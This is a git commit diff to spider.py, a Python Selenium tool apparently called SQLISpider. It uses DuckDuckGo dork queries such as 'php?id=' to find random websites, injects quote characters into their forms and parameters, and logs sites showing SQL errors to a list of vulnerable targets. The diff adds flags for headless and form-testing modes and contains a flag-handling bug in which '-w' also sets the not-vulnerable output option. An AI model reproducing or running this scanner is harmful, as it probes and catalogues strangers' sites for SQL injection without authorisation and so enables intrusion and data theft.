8f4402852bb6ef2a5640aea7ccbcf08fc996cefb
SourceCode347 <80837445+sourcecode347@users.noreply.github.com>
2022-08-20 00:48:01 +0300

    Add files via upload

--- spider.py
+++ spider.py
@@ -34,16 +34,36 @@ import random,time,requests
 from selenium import webdriver
 from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
 from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.firefox.options import Options as FirefoxOptions
+from selenium.webdriver.firefox.service import Service
+from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
 from termcolor import colored
 from urllib.parse import urljoin
 from random_word import RandomWords
+import sys
 
 r = RandomWords()
 sqlilist="sqlilist.txt"
-
+r_args=['-h','-f','-w','-n']
+hless = False
+iforms = False
+cwind = False
+nvuln = False
+for arg in range(0,len(sys.argv)):
+    if sys.argv[arg-1]=="-h":
+        hless=True
+    if sys.argv[arg-1]=="-f":
+        iforms=True
+    if sys.argv[arg-1]=="-w":
+        cwind=True
+    if sys.argv[arg-1]=="-w":
+        nvuln=True
+if cwind == True:
+    import colorama
+    colorama.init ()
 logo = '''
-Simple
 
  _______  _______  _       _________   _______  _______ _________ ______   _______  _______ 
 (  ____ \(  ___  )( \      \__   __/  (  ____ \(  ____ )\__   __/(  __  \ (  ____ \(  ____ )
@@ -62,8 +82,10 @@ print(colored(logo , "green"))
 def openbrowser():
     global browser
     options = webdriver.FirefoxOptions()
-    options.add_argument("--headless")
-    browser = webdriver.Firefox(executable_path="/home/baz/Desktop/geckodriver",options=options)
+    if hless==True:
+        options.add_argument("--headless")
+    ser=Service("/home/zerocode/Desktop/SQLISpider/geckodriver")
+    browser = webdriver.Firefox(service=ser,options=options)
     time.sleep(5)
 def navigate(link):
     browser.get(link)
@@ -88,25 +110,25 @@ def is_vulnerable(source):
     return False
 openbrowser()
 while True:
-   rnum = random.randint(0,5)
+   rnum = random.randint(0,2)
    if rnum ==0:
-       dork = "https://duckduckgo.com/?q=php%3Fid%3D"+str(random.randint(0,100000))+"+"+str(r.get_random_word())+"&t=h_&ia=web"
+       dork = "https://duckduckgo.com/?q="+str(r.get_random_word())+"&t=h_&ia=web"
    elif rnum ==1:
-       dork = "https://duckduckgo.com/?q=inurl:%3Fid%3D"+str(random.randint(0,100000))+"&t=h_&ia=web"
+       dork = "https://duckduckgo.com/?q=%3Fid%3D"+str(random.randint(0,100000))+"&t=h_&ia=web"
    else:
        dork = "https://duckduckgo.com/?q=php%3Fid%3D"+str(random.randint(0,100000))+"&t=h_&ia=web"
    navigate(dork)
    testlinks=[]
    for x in range(0,5):
        try:
-           m=browser.find_element_by_partial_link_text("More Results")
+           m=browser.find_element(By.PARTIAL_LINK_TEXT,"More Results")
            m.click()
            time.sleep(3)
        except:
            pass
-   fl = browser.find_elements_by_xpath("//a[@class='result__url js-result-extras-url']")
+   fl = browser.find_elements(By.XPATH,"//a[@data-testid='result-title-a']")
    for l in fl:
-       tl = l.text
+       tl = l.get_attribute("href")
        #print(tl)
        testlinks.append(tl)
    for tl in testlinks:
@@ -119,50 +141,55 @@ while True:
                    with open(sqlilist,"a") as f:
                       f.write(tl+"\n")
                       f.close()
+               elif iforms==False and nvuln==True:
+                   print(tl , colored("Not Found" , "red" , attrs=['bold']))
                else:
-                   forms = browser.find_elements_by_xpath("//form")
-                   print(f"[+] Detected {len(forms)} forms on {tl}.")
-                   if len(forms) > 0:
-                       for form in forms:
-                           form_inputs = form.find_elements_by_xpath("//input")
-                           action = form.get_attribute('action')
-                           action=action.lower()
-                           method = form.get_attribute('method')
-                           method=method.lower()
-                           for c in "\"'":
-                               # the data body we want to submit
-                               data = {}
-                               for fi in form_inputs:
-                                   if fi.get_attribute('value') or fi.get_attribute('type') == "hidden":
-                                       # any input form that has some value or hidden,
-                                       # just use it in the form body
-                                       try:
-                                           data[fi.get_attribute('name')] = fi.get_attribute('value') + c
-                                       except:
-                                           pass
-                                   elif fi.get_attribute('type') != "submit":
-                                       # all others except submit, use some junk data with special character
-                                       data[fi.get_attribute('name')] = f"test{c}"
-                               # join the url with the action (form request URL)
-                               url = urljoin(tl, action)
-                               if method == "post":
-                                   res = requests.post(url, data=data)
-                                   source=res.text
-                               elif method == "get":
-                                   res = requests.get(url, data=data)
-                                   source=res.text
-                               # test whether the resulting page is vulnerable
-                               if is_vulnerable(source) == True:
-                                   #print("[+] SQL Injection vulnerability detected, link:", url)
-                                   print(tl , colored("Vuln Found" , "green" , attrs=['bold']))
-                                   with open(sqlilist,"a") as f:
-                                      f.write(tl+"\n")
-                                      f.close()
-                                      break
-                               else:
-                                   print(tl , colored("Not Found" , "red" , attrs=['bold']))
-                   else:
-                       print(tl , colored("Not Found" , "red" , attrs=['bold']))
+                   if iforms==True:
+                       forms = browser.find_elements(By.XPATH,"//form")
+                       print(f"[+] Detected {len(forms)} forms on {tl}.")
+                       if len(forms) > 0:
+                           for form in forms:
+                               form_inputs = form.find_elements(By.XPATH,"//input")
+                               action = form.get_attribute('action')
+                               action=action.lower()
+                               method = form.get_attribute('method')
+                               method=method.lower()
+                               for c in "\"'":
+                                   # the data body we want to submit
+                                   data = {}
+                                   for fi in form_inputs:
+                                       if fi.get_attribute('value') or fi.get_attribute('type') == "hidden":
+                                           # any input form that has some value or hidden,
+                                           # just use it in the form body
+                                           try:
+                                               data[fi.get_attribute('name')] = fi.get_attribute('value') + c
+                                           except:
+                                               pass
+                                       elif fi.get_attribute('type') != "submit":
+                                           # all others except submit, use some junk data with special character
+                                           data[fi.get_attribute('name')] = f"test{c}"
+                                   # join the url with the action (form request URL)
+                                   url = urljoin(tl, action)
+                                   if method == "post":
+                                       res = requests.post(url, data=data)
+                                       source=res.text
+                                   elif method == "get":
+                                       res = requests.get(url, data=data)
+                                       source=res.text
+                                   # test whether the resulting page is vulnerable
+                                   if is_vulnerable(source) == True:
+                                       #print("[+] SQL Injection vulnerability detected, link:", url)
+                                       print(tl , colored("Vuln Found" , "green" , attrs=['bold']))
+                                       with open(sqlilist,"a") as f:
+                                          f.write(tl+"\n")
+                                          f.close()
+                                          break
+                                   else:
+                                       if nvuln==True:
+                                           print(tl , colored("Not Found" , "red" , attrs=['bold']))
+                       else:
+                           if nvuln==True:
+                               print(tl , colored("Not Found" , "red" , attrs=['bold']))
        except:
            pass
    #browser.quit()
